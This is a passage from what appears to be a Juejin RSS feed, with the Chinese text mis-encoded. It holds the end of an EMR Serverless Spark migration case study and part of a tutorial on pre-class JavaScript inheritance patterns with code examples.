<li>é€šè¿‡æ¥å…¥Â EMRÂ ServerlessÂ SparkÂ å®˜æ–¹æä¾›çš„Â spark-submitÂ å·¥å…·è¿›è¡Œæ•°ä»“è°ƒåº¦ï¼Œè¯¥å·¥å…·100%å…¼å®¹å¼€æºÂ spark-submitÂ å·¥å…·ï¼Œä¸ºæ•°ä»“çš„æ•´ä½“è¿ç§»æä¾›äº†å·¨å¤§çš„ä¾¿åˆ©ã€‚</li>
<li>é€šè¿‡æ¥å…¥Â EMRÂ ServerlessÂ SparkÂ çš„Â KyuubiÂ GatewayÂ è¿›è¡Œæ—¥å¸¸æ•°æ®åˆ†æå’Œå³å¸­æŸ¥è¯¢ã€‚KyuubiÂ GatewayÂ åŒæ ·ä¹Ÿæä¾›äº†100%å…¼å®¹å¼€æºçš„Â restfulÂ å’ŒÂ jdbcÂ æ¥å£ï¼Œå¦å¤–åœ¨å¼€æºåŸºç¡€ä¸Šå¢å¼ºäº†äº‘åŸç”Ÿéƒ¨ç½²ç¯å¢ƒä¸‹çš„ç¨³å®šæ€§å’Œæäº¤å¹¶å‘æ€§èƒ½ã€‚</li>
</ul>
<p><strong>ç®¡æ§é¢</strong></p>
<ul>
<li>ç”¨æˆ·æ— æ„Ÿçš„å…¨é“¾è·¯å¤šÂ AZÂ é«˜å¯ç”¨ï¼Œæä¾›ç¨³å®šå®‰å…¨7Â *Â 24å°æ—¶çš„Â PAASÂ æœåŠ¡ã€‚</li>
<li>é€šè¿‡èµ„æºé˜Ÿåˆ—ç®¡ç†èƒ½åŠ›éš”ç¦»ä¸åŒä¸šåŠ¡å›¢é˜Ÿçš„èµ„æºä½¿ç”¨ï¼Œä¸šåŠ¡å³°è°·æ—¶æœŸèƒ½å¤Ÿå¿«é€Ÿè¿›è¡Œèµ„æºä¸Šé™è°ƒæ•´ã€‚</li>
<li>é€šè¿‡ä½œä¸šçº§åˆ«ç®¡ç†èƒ½åŠ›è¿›è¡Œæ—¥å¸¸çš„ä½œä¸šè¿ç»´å’Œè°ƒä¼˜ï¼Œèµ„æºä½¿ç”¨æƒ…å†µå¯ç»†åŒ–åˆ°ä½œä¸šç»´åº¦ï¼Œæ˜“äºè¿›è¡Œé’ˆå¯¹æ€§æˆæœ¬ä¼˜åŒ–ã€‚</li>
</ul>
<p><strong>è®¡ç®—é¢</strong></p>
<ul>
<li>
<p>å¼•æ“èƒ½åŠ›</p>
</li>
<li>
<ul>
<li>æ•°ä»“Â SQLÂ ä½œä¸šé»˜è®¤å¼€å¯Â fusionÂ åŠ é€Ÿæå‡Â SQLÂ æ‰§è¡Œæ€§èƒ½</li>
</ul>
</li>
<li>
<ul>
<li>é»˜è®¤ä½¿ç”¨å†…ç½®Â CelebornÂ æœåŠ¡è¿›è¡ŒÂ Shuffleï¼Œæå‡å¤§Â ShuffleÂ ç¨³å®šæ€§</li>
</ul>
</li>
<li>
<p>æè‡´å¼¹æ€§</p>
</li>
<li>
<ul>
<li>å…¼å®¹å¼€æºÂ SparkÂ èµ„æºé…ç½®æ”¯æŒæœ€çŸ­å¼¹æ€§æ­¥é•¿ä¸º1CUçš„å¼¹æ€§èƒ½åŠ›</li>
</ul>
</li>
<li>
<ul>
<li>ä¾èµ–èµ„æºåº•åº§æœåŠ¡ä¿éšœèµ„æºä¾›ç»™</li>
</ul>
</li>
</ul>
<h2 data-id="heading-4">å››ã€è¿ç§»åçš„æ”¶ç›Š</h2>
<ul>
<li>
<p><strong>æŠ€æœ¯å±‚é¢</strong></p>
<ul>
<li>
<p>æ€§èƒ½</p>
<ul>
<li>æ ¸å¿ƒä»»åŠ¡è¿è¡Œæ—¶é—´ç¼©çŸ­30åˆ†é’Ÿ</li>
<li>å¤©çº§æŠ¥è¡¨äº§å‡ºæ—¶é—´æå‰5å°æ—¶</li>
</ul>
</li>
<li>
<p>ä¸šåŠ¡ç¨³å®šæ€§</p>
<ul>
<li>æ•°ä»“ä»»åŠ¡è¿ç»­60å¤©æ²¡æœ‰Â SLAÂ breakÂ </li>
</ul>
</li>
<li>
<p>è¿ç»´çµæ´»æ€§</p>
<ul>
<li>
<p>ä¸å†å…³å¿ƒèµ„æºå±‚è¿ç»´ï¼Œåœ¨ä¸šåŠ¡å³°è°·æ—¶æœŸå¯ä»¥è¿›è¡Œç§’çº§æ‰©ç¼©å®¹</p>
</li>
<li>
<p>æ‰©ç¼©å®¹æ­¥é•¿ä¸º1CUï¼Œè¾¾åˆ°æ¥è¿‘100%çš„èµ„æºä½¿ç”¨ç‡</p>
</li>
<li>
<p>æ ¹æ®ä½œä¸šçº§åˆ«çš„èµ„æºæ¶ˆè€—ç»Ÿè®¡å¿«é€Ÿå®šä½ä¸ç¬¦åˆé¢„æœŸçš„ä½œä¸šå¹¶è¿›è¡Œé’ˆå¯¹æ€§ä¼˜åŒ–</p>
</li>
<li>
<p>è¿è¡Œç¯å¢ƒéš”ç¦»ï¼Œé¿å…ä½œä¸šä¹‹é—´äº’ç›¸å¹²æ‰°ï¼Œæœ€å¤§ç¨‹åº¦çš„é™ä½è¿ç»´é£é™©</p>
<ul>
<li>
<p>ä½œä¸šçº§åˆ«éš”ç¦»Â SparkÂ ç‰ˆæœ¬ï¼Œå¯å¿«é€Ÿæµ‹è¯•éªŒè¯æœ€æ–°ç‰ˆæœ¬Â SparkÂ ç›¸å…³Â feature</p>
</li>
<li>
<p>ä½œä¸šçº§åˆ«ç•Œé¢åŒ–å®šåˆ¶Â PythonÂ ç¯å¢ƒï¼Œé¿å…é»‘å±æ“ä½œå…¨å±€Â PythonÂ ç¯å¢ƒå¸¦æ¥çš„ç”Ÿäº§é£é™©</p>
</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>è´¢åŠ¡å±‚é¢</p>
<ul>
<li>
<p>æˆæœ¬ä¼˜åŒ–</p>
<ul>
<li>
<p>æ•°ä»“ç¦»çº¿é“¾è·¯æˆæœ¬é™ä½35%</p>
</li>
<li>
<p>adhocÂ æŸ¥è¯¢æˆæœ¬é™ä½30%</p>
</li>
</ul>
</li>
</ul>
</li>
<li>
<p>ä¸šåŠ¡å±‚é¢</p>
<ul>
<li>
<p>ä¸šåŠ¡å›¢é˜Ÿå› æ•°æ®è·å–æ•ˆç‡æå‡ï¼Œå‡å°‘äº†çº¦Â 40%Â çš„æ— æ•ˆç­‰å¾…æ—¶é—´ï¼Œå¯å°†ç²¾åŠ›æŠ•å…¥åˆ°ä¸šåŠ¡ä¼˜åŒ–ã€äº§å“è¿è¥ç­‰ä»·å€¼ç¯èŠ‚ã€‚</p>
</li>
<li>
<p>æ•°æ®å‡†ç¡®æ€§çš„æå‡ï¼ˆå› Â ServerlessÂ SparkÂ æ€§èƒ½ç¨³å®šï¼Œæ•°æ®å¤„ç†å‡ºé”™ç‡é™ä½Â 90%ï¼‰è®©ä¸šåŠ¡é¿å…äº†å› æ•°æ®é”™è¯¯å¯¼è‡´çš„å†³ç­–å¤±è¯¯æŸå¤±ã€‚</p>
</li>
</ul>
</li>
</ul>
<h2 data-id="heading-5">äº”ã€æœªæ¥å±•æœ›</h2>
<ul>
<li>
<p>æ¨è¿›æŒ‡æ ‡åŠ é€Ÿå±‚å»ºè®¾ï¼Œå®ç°Â StarRocksÂ ä¸Â ServerlessÂ SparkÂ çš„è‡ªåŠ¨åŒ–ååŒ</p>
</li>
<li>
<p>æ·±åŒ–æ¹–ä»“ä¸€ä½“èƒ½åŠ›ï¼Œæ¢ç´¢Â PaimonÂ +Â ServerlessÂ SparkÂ +Â StarRocksÂ çš„ç«¯åˆ°ç«¯ä¼˜åŒ–</p>
</li>
<li>
<p>æŒç»­åˆ©ç”¨Â EMRÂ äº§å“è¿­ä»£ï¼ˆå¦‚ç»Ÿä¸€Â Catalogã€AIÂ Functionï¼‰èµ‹èƒ½æ•°æ®æ™ºèƒ½åŒ–</p>
</li>
</ul></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[class å‡ºç°å‰ï¼ŒJS æ˜¯æ€ä¹ˆç»§æ‰¿çš„]]></title>    <link>https://juejin.cn/post/7582200865908375586</link>    <guid>https://juejin.cn/post/7582200865908375586</guid>    <pubDate>2025-12-11T08:31:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7582200865908375586" data-draft-id="7582358932027670543" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content=" class å‡ºç°å‰ï¼ŒJS æ˜¯æ€ä¹ˆç»§æ‰¿çš„"/> <meta itemprop="keywords" content="å‰ç«¯,JavaScript,é¢è¯•"/> <meta itemprop="datePublished" content="2025-12-11T08:31:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="T___T"/> <meta itemprop="url" content="https://juejin.cn/user/1599155645973066"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
             class å‡ºç°å‰ï¼ŒJS æ˜¯æ€ä¹ˆç»§æ‰¿çš„
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1599155645973066/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    T___T
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-11T08:31:29.000Z" title="Thu Dec 11 2025 08:31:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-11
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»5åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{color:#595959;font-size:15px;font-family:-apple-system,system-ui,BlinkMacSystemFont,Helvetica Neue,PingFang SC,Hiragino Sans GB,Microsoft YaHei,Arial,sans-serif;background-image:linear-gradient(90deg,rgba(60,10,30,.04) 3%,transparent 0),linear-gradient(1turn,rgba(60,10,30,.04) 3%,transparent 0);background-size:20px 20px;background-position:50%}.markdown-body p{color:#595959;font-size:15px;line-height:2;font-weight:400}.markdown-body p+p{margin-top:16px}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{padding:30px 0;margin:0;color:#135ce0}.markdown-body h1{position:relative;text-align:center;font-size:22px;margin:50px 0}.markdown-body h1:before{position:absolute;content:"";top:-10px;left:50%;width:32px;height:32px;transform:translateX(-50%);background-size:100% 100%;opacity:.36;background-repeat:no-repeat;background:url(data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAACAAAAAgCAMAAABEpIrGAAAABGdBTUEAALGPC/xhBQAAACBjSFJNAAB6JgAAgIQAAPoAAACA6AAAdTAAAOpgAAA6mAAAF3CculE8AAABfVBMVEX///8Ad/8AgP8AgP8AgP8Aff8AgP8Af/8AgP8AVf8Af/8Af/8AgP8AgP8Af/8Afv8AAP8Afv8Afv8Aef8AgP8AdP8Afv8AgP8AgP8Acf8Ae/8AgP8Af/8AgP8Af/8Af/8AfP8Afv8AgP8Af/8Af/8Afv8Afv8AgP8Afv8AgP8Af/8Af/8AgP8AgP8Afv8AgP8Af/8AgP8AgP8AgP8Ae/8Afv8Af/8AgP8Af/8AgP8Af/8Af/8Aff8Af/8Abf8AgP8Af/8AgP8Af/8Af/8Afv8AgP8AgP8Afv8Afv8AgP8Af/8Aff8AgP8Afv8AgP8Aff8AgP8AfP8AgP8Ae/8AgP8Af/8AgP8AgP8AgP8Afv8AgP8AgP8AgP8Afv8AgP8AgP8AgP8AgP8AgP8Af/8AgP8Af/8Af/8Aev8Af/8AgP8Aff8Afv8AgP8AgP8AgP8Af/8AgP8Af/8Af/8AgP8Afv8AgP8AgP8AgP8AgP8Af/8AeP8Af/8Af/8Af//////rzEHnAAAAfXRSTlMAD7CCAivatxIDx5EMrP19AXdLEwgLR+6iCR/M0yLRzyFF7JupSXn8cw6v60Q0QeqzKtgeG237HMne850/6Qeq7QaZ+WdydHtj+OM3qENCMRYl1B3K2U7wnlWE/mhlirjkODa9FN/BF7/iNV/2kASNZpX1Wlf03C4stRGxgUPclqoAAAABYktHRACIBR1IAAAACXBIWXMAAAsTAAALEwEAmpwYAAAAB3RJTUUH4gEaBzgZ4yeM3AAAAT9JREFUOMvNUldbwkAQvCAqsSBoABE7asSOBRUVVBQNNuy9996789+9cMFAMHnVebmdm+/bmdtbQv4dOFOW2UjPzgFyLfo6nweKfIMOBYWwFtmMPGz2Yj2pJI0JDq3udJW6VVbmKa9I192VQFV1ktXUAl5NB0cd4KpnORqsEO2ZIRpF9gJfE9Dckqq0KuZt7UAH5+8EPF3spjsRpCeQNO/tA/qDwIDA+OCQbBoKA8NOdjMySgcZGVM6jwcgRuUiSs0nlPFNSrEpJfU0jTLD6llqbvKxei7OzvkFNQohi0vAsj81+MoqsCaoPOQFgus/1LyxichW+hS2JWCHZ7VlF9jb187pIAYcHiViHAMnp5mTjJ8B5xeEXF4B1ze/fTh/C0h398DDI9HB07O8ci+vRBdvdGnfP4gBuM8vw7X/G3wDmFhFZEdxzjMAAAAldEVYdGRhdGU6Y3JlYXRlADIwMTgtMDEtMjZUMDc6NTY6MjUrMDE6MDA67pVWAAAAJXRFWHRkYXRlOm1vZGlmeQAyMDE4LTAxLTI2VDA3OjU2OjI1KzAxOjAwS7Mt6gAAABl0RVh0U29mdHdhcmUAd3d3Lmlua3NjYXBlLm9yZ5vuPBoAAAAWdEVYdFRpdGxlAGp1ZWppbl9sb2dvIGNvcHlxapmKAAAAV3pUWHRSYXcgcHJvZmlsZSB0eXBlIGlwdGMAAHic4/IMCHFWKCjKT8vMSeVSAAMjCy5jCxMjE0uTFAMTIESANMNkAyOzVCDL2NTIxMzEHMQHy4BIoEouAOoXEXTyQjWVAAAAAElFTkSuQmCC)}.markdown-body h2{position:relative;font-size:20px;border-left:4px solid;padding:0 0 0 10px;margin:30px 0}.markdown-body h3{font-size:16px}.markdown-body ul{list-style:disc outside;margin-left:2em;margin-top:1em}.markdown-body li{line-height:2;color:#595959}.markdown-body img.loaded{margin:0 auto;display:block}.markdown-body blockquote{background:#fff9f9;margin:2em 0;padding:2px 20px;border-left:4px solid #b2aec5}.markdown-body blockquote p{color:#666;line-height:2}.markdown-body a{color:#036aca;border-bottom:1px solid rgba(3,106,202,.8);font-weight:400;text-decoration:none}.markdown-body em strong,.markdown-body strong{color:#036aca}.markdown-body hr{border-top:1px solid #135ce0}.markdown-body pre{overflow:auto}.markdown-body code,.markdown-body pre{overflow:auto;position:relative;line-height:1.75;font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body table{border-collapse:collapse;margin:1rem 0;overflow-x:auto}.markdown-body table td,.markdown-body table th{border:1px solid #dfe2e5;padding:.6em 1em}.markdown-body table tr{border-top:1px solid #dfe2e5}.markdown-body table tr:nth-child(2n){background-color:#f6f8fa}</style><style data-highlight="">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>ä¸ææ˜ç™½ç»§æ‰¿ï¼Œè¿™è¾ˆå­å¯èƒ½å°±å›°åœ¨â€œæ¬ç –å¼ç¼–ç¨‹â€é‡Œäº†ã€‚</p>
<p>ä¸‹é¢å°±æŒ‰â€œç”±æµ…å…¥æ·±â€çš„é¡ºåºï¼Œèµ°ä¸€é JSÂ ç»§æ‰¿çš„è¿›åŒ–ä¹‹è·¯ï¼š<br/>
ä»æœ€åŸå§‹çš„å†™æ³•ï¼Œä¸€ç›´èµ°åˆ°ç›¸å¯¹æˆç†Ÿã€å¯å¤ç”¨çš„æ¨¡å¼ã€‚</p>
<h2 data-id="heading-0">ä¸€ã€åŸå§‹æ—¶ä»£ï¼šå®Œå…¨æ²¡æœ‰ç»§æ‰¿ï¼Œå…¨é æ‰‹æŠ„</h2>
<p>æœ€æ—©çš„å†™æ³•å¤§æ¦‚æ˜¯è¿™æ ·ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä½ å¥½ï¼Œæˆ‘æ˜¯ '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Student</span>(<span class="hljs-params">name, age, school</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;   <span class="hljs-comment">// åˆå†™ä¸€é</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;     <span class="hljs-comment">// å†å†™ä¸€é</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">school</span> = school;
}
</code></pre>
<p>é—®é¢˜å¾ˆç›´æ¥ï¼š</p>
<ul>
<li><strong>çˆ¶å­é€»è¾‘é‡å¤</strong>ï¼š<code>name</code>ã€<code>age</code>Â çš„èµ‹å€¼å†™äº†ä¸¤æ¬¡</li>
<li>ä¸€æ—¦å­—æ®µå˜åŒ–ï¼Œè¦æ”¹ä¸¤ä»½ï¼Œææ˜“å‡ºé”™</li>
<li>æ˜æ˜â€œå­¦ç”Ÿâ€å°±æ˜¯â€œäººâ€çš„ä¸€ç§ï¼Œå´ç¡¬ç”Ÿç”Ÿå†™æˆä¸¤å¥—</li>
</ul>
<p>äºæ˜¯ä½ ä¼šæƒ³åˆ°ï¼šæˆ‘èƒ½ä¸èƒ½åœ¨Â <code>Student</code>Â é‡Œé¢ç›´æ¥<strong>å€Ÿç”¨ä¸€ä¸‹Â <code>Person</code>Â çš„æ„é€ å‡½æ•°</strong>ï¼Ÿ</p>
<h2 data-id="heading-1">äºŒã€ç¬¬ä¸€æ­¥è¿›åŒ–ï¼šæ„é€ å‡½æ•°ç»§æ‰¿â€”â€”â€œå…ˆæŠŠå±æ€§å€Ÿè¿‡æ¥å†è¯´â€</h2>
<p>æœ‰äº†Â <code>call</code>Â /Â <code>apply</code>ï¼Œä½ å°±èƒ½è¿™ä¹ˆå¹²ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä½ å¥½ï¼Œæˆ‘æ˜¯ '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Student</span>(<span class="hljs-params">name, age, school</span>) {
  <span class="hljs-comment">// å€Ÿç”¨æ„é€ å‡½æ•°ï¼ŒæŠŠ this æŒ‡å‘å½“å‰å®ä¾‹</span>
  <span class="hljs-title class_">Person</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, [name, age]); <span class="hljs-comment">// æˆ– Person.call(this, name, age)</span>
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">school</span> = school;
}

<span class="hljs-keyword">const</span> s = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Student</span>(<span class="hljs-string">'å¼ ä¸‰'</span>, <span class="hljs-number">18</span>, <span class="hljs-string">'ä¸€ä¸­'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(s.<span class="hljs-property">name</span>, s.<span class="hljs-property">age</span>, s.<span class="hljs-property">school</span>);
</code></pre>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li><strong>å®ä¾‹å±æ€§ç»§æ‰¿åˆ°äº†</strong>ï¼š<code>name</code>ã€<code>age</code>Â éƒ½æœ‰</li>
<li>æ¯ä¸ªå®ä¾‹å„è‡ªä¸€ä»½ï¼Œä¸ä¼šäº’ç›¸æ±¡æŸ“</li>
</ul>
<p>ç¼ºç‚¹ä¹Ÿå¾ˆæ˜æ˜¾ï¼š</p>
<ul>
<li><strong>åŸå‹ä¸Šçš„æ–¹æ³•ç»§æ‰¿ä¸åˆ°</strong>ï¼š<code>sayHi</code>Â å®šä¹‰åœ¨åŸå‹ä¸Šï¼Œ<code>Student</code>Â å®ä¾‹æ˜¯æ‹¿ä¸åˆ°çš„</li>
</ul>
<p>è¿™å°±åƒåªç»§æ‰¿äº†â€œèº«ä»½è¯ä¿¡æ¯â€ï¼Œæ²¡ç»§æ‰¿â€œå®¶æ—æŠ€èƒ½â€ã€‚</p>
<p>ä½ ä¼šå‘ç°ï¼šå±æ€§æå®šäº†ï¼Œä½†è¡Œä¸ºè¿˜ä¸è¡Œã€‚</p>
<h2 data-id="heading-2">ä¸‰ã€ç¬¬äºŒæ­¥ï¼šåŸå‹é“¾ç»§æ‰¿â€”â€”â€œæˆ‘è¦ç»§æ‰¿ä½ çš„æŠ€èƒ½â€</h2>
<p>å¾ˆè‡ªç„¶å°±ä¼šæƒ³åˆ°åŸå‹é“¾ï¼š</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä½ å¥½ï¼Œæˆ‘æ˜¯ '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Student</span>(<span class="hljs-params">name, age, school</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">school</span> = school;
}

<span class="hljs-comment">// å…³é”®ï¼šåŸå‹é“¾ç»§æ‰¿</span>
<span class="hljs-title class_">Student</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span> = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Person</span>(<span class="hljs-string">'é»˜è®¤å'</span>, <span class="hljs-number">0</span>);
<span class="hljs-title class_">Student</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">constructor</span> = <span class="hljs-title class_">Student</span>;
</code></pre>
<p>ä¼˜ç‚¹ï¼š</p>
<ul>
<li><strong>å¯ä»¥è®¿é—®çˆ¶çº§åŸå‹ä¸Šçš„æ–¹æ³•</strong>ï¼š<code>sayHi</code>Â ç”Ÿæ•ˆäº†</li>
<li>å­ç±»å‹åŸå‹ä¸Šå†ç»§ç»­æŒ‚æ–¹æ³•ä¹Ÿæ²¡é—®é¢˜</li>
</ul>
<p>ä½†è¿™é‡Œæœ‰å‡ ä¸ªéšæ‚£ï¼š</p>
<ul>
<li><code>new Person('é»˜è®¤å', 0)</code>Â ä¼š<strong>è°ƒç”¨ä¸€æ¬¡çˆ¶ç±»æ„é€ å‡½æ•°</strong></li>
<li>å¦‚æœçˆ¶æ„é€ å‡½æ•°é‡Œæœ‰æ•°ç»„ã€å¯¹è±¡ç­‰å¼•ç”¨ç±»å‹å±æ€§ï¼Œæ‰€æœ‰é€šè¿‡åŸå‹ç»§æ‰¿çš„å­å®ä¾‹ä¼š<strong>å…±äº«è¿™ä»½æ•°æ®</strong>ï¼Œå®¹æ˜“å‡ºç°â€œä½ æ”¹æˆ‘ä¹Ÿå˜â€çš„æ€ªäº‹</li>
<li>è€Œä¸”ï¼ŒçœŸæ­£åˆ›å»ºå­¦ç”Ÿå®ä¾‹æ—¶ï¼Œä½ è¿˜ä¼šåœ¨Â <code>Student</code>Â é‡Œå†å¤„ç†ä¸€å¥—æ•°æ®ï¼Œç•¥æ˜¾è‡ƒè‚¿</li>
</ul>
<p>äºæ˜¯å¤§å®¶ç»§ç»­æŠ˜è…¾ï¼ŒæŠŠâ€œæ„é€ å‡½æ•°ç»§æ‰¿â€å’Œâ€œåŸå‹é“¾ç»§æ‰¿â€åˆåœ¨ä¸€èµ·ã€‚</p>
<h2 data-id="heading-3">å››ã€ç¬¬ä¸‰æ­¥ï¼šç»„åˆç»§æ‰¿â€”â€”â€œå±æ€§å½’ä½ ï¼ŒæŠ€èƒ½ä¹Ÿå½’ä½ â€</h2>
<p>æ‰€è°“ç»„åˆç»§æ‰¿ï¼Œå°±æ˜¯ï¼š</p>
<ul>
<li>ç”¨Â <code>call/apply</code>Â ç»§æ‰¿<strong>å®ä¾‹å±æ€§</strong></li>
<li>ç”¨åŸå‹é“¾ç»§æ‰¿<strong>åŸå‹æ–¹æ³•</strong></li>
</ul>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">function</span> <span class="hljs-title function_">Person</span>(<span class="hljs-params">name, age</span>) {
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span> = name;
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">age</span> = age;
}
<span class="hljs-title class_">Person</span>.<span class="hljs-property"><span class="hljs-keyword">prototype</span></span>.<span class="hljs-property">sayHi</span> = <span class="hljs-keyword">function</span> (<span class="hljs-params"/>) {
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'ä½ å¥½ï¼Œæˆ‘æ˜¯ '</span> + <span class="hljs-variable language_">this</span>.<span class="hljs-property">name</span>);
};

<span class="hljs-keyword">function</span> <span class="hljs-title function_">Student</span>(<span class="hljs-params">name, age, school</span>) {
  <span class="hljs-comment">// 1. ç»§æ‰¿å®ä¾‹å±æ€§</span>
  <span class="hljs-title class_">Person</span>.<span class="hljs-title function_">apply</span>(<span class="hljs-variable language_">this</span>, [name, age]);
  <span class="hljs-variable language_">this</span>.<span class="hljs-property">school</span> = school;
}

